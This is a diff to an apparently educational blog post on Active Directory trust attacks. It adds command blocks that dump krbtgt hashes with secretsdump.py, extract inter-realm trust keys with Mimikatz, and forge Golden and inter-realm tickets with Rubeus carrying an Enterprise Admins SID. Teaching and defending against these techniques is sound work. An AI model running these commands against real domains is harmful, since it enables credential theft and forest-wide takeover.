@@ -55,6 +55,19 @@ A Golden Ticket forged from a child domain's krbtgt hash, Part 3's endgame, is v
 
 SID History exists for a legitimate reason: when a user is migrated from one domain to another, tools like ADMT copy their old SID into the new account's SID History attribute so access permissioned against the old SID keeps working during the transition. Kerberos writes every SID in that attribute into the ticket's PAC alongside the account's own SID, which means anything holding those SIDs is granted, not just the account itself. Rubeus's `/sids` flag (or Mimikatz's `kerberos::golden /sids`) writes an arbitrary SID directly into a forged ticket's PAC the same way, and the SID an attacker actually wants there is the parent domain's Enterprise Admins group.
 
+**Requirements:** the child domain's krbtgt hash (via DCSync, Part 3's endgame, scoped to the child) and the parent domain's Enterprise Admins group SID, which is just the parent's domain SID with the well-known `-519` RID appended.
+
+```bash
+# pull the child domain's krbtgt hash
+secretsdump.py -just-dc-user krbtgt $CHILD_DOMAIN/$USER:$PASSWORD@$CHILD_DC
+
+# forge a Golden Ticket in the child domain, with the parent's Enterprise Admins SID added
+Rubeus.exe golden /rc4:$CHILD_KRBTGT_HASH /domain:$CHILD_DOMAIN /sid:$CHILD_DOMAIN_SID /sids:$PARENT_DOMAIN_SID-519 /user:anyuser /ptt
+
+# equivalent with Mimikatz
+kerberos::golden /user:anyuser /domain:$CHILD_DOMAIN /sid:$CHILD_DOMAIN_SID /krbtgt:$CHILD_KRBTGT_HASH /sids:$PARENT_DOMAIN_SID-519 /ptt
+```
+
 <div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
   <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "620px" }} role="img" aria-label="A four-step horizontal chain: an attacker compromises a child domain's krbtgt hash, forges a Golden Ticket with the parent domain's Enterprise Admins SID written into the ExtraSids field, and because SID filtering is off by default on intra-forest trusts, that extra SID is honored forest-wide, granting full Enterprise Admin access from a single child domain compromise.">
     <rect x="5" y="60" width="140" height="46" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
@@ -84,6 +97,20 @@ SID History exists for a legitimate reason: when a user is migrated from one dom
 ## Crossing a Trust Directly: Stolen Trust Keys and Forged Inter-Realm Tickets
 
 The second path doesn't need a child domain relationship at all, any bidirectional trust will do, forest or external. An attacker with Domain Admin rights on one side of the trust extracts the inter-realm trust key itself, with Mimikatz's `lsadump::trust /patch` on a domain controller or by DCSyncing the Trusted Domain Object directly, and then forges an inter-realm TGT signed with that stolen key, the same referral mechanism the legitimate exchange above uses, claiming whatever group membership the attacker wants via the same ExtraSids mechanism.
+
+**Requirements:** Domain Admin (or equivalent) on one side of any bidirectional trust, plus, for the privileged-SID claim to actually land, SID filtering already relaxed on that trust, since it's on by default for forest and external trusts.
+
+```bash
+# extract the inter-realm trust key from a domain controller
+mimikatz.exe "privilege::debug" "lsadump::trust /patch" "exit"
+
+# or DCSync the Trusted Domain Object directly
+secretsdump.py -just-dc $DOMAIN/$USER:$PASSWORD@$DC_IP
+
+# forge an inter-realm TGT signed with the stolen key, claiming a privileged SID
+Rubeus.exe golden /rc4:$TRUST_KEY /domain:$DOMAIN /sid:$DOMAIN_SID /sids:$TARGET_DOMAIN_SID-519 /user:anyuser /ticket:trust_tkt.kirbi
+Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/target.$TRUSTED_DOMAIN /dc:$TRUSTED_DC /ptt
+```
 
 <div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
   <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "620px" }} role="img" aria-label="A four-step horizontal chain: an attacker with Domain Admin rights on one side of a forest or external trust extracts the inter-realm trust key, forges an inter-realm TGT signed with that key claiming privileged group membership, and because SID filtering is on by default for these trust types, the claim is blocked unless SID filtering has already been relaxed, for example to support a domain migration.">
@@ -152,3 +179,5 @@ Part 1 spent one sentence on this: an Enterprise Admin, or a compromised Schema 
 	The /sids flag referenced in the Child-to-Parent section.
 10. "Active Directory Series: Part 1 - What Active Directory Actually Is" (this blog). [/posts/active-directory-security-part1](/posts/active-directory-security-part1)
 	The forest-as-security-boundary framing this entire post is built to justify in detail.
+11. The Hacker Recipes, "Active Directory: Movement / Trust." [https://www.thehacker.recipes/ad/movement/trust-relationship](https://www.thehacker.recipes/ad/movement/trust-relationship)
+	A command-level reference for trust and forest escalation, used as a structural model for the requirements lines and command blocks added throughout this post.
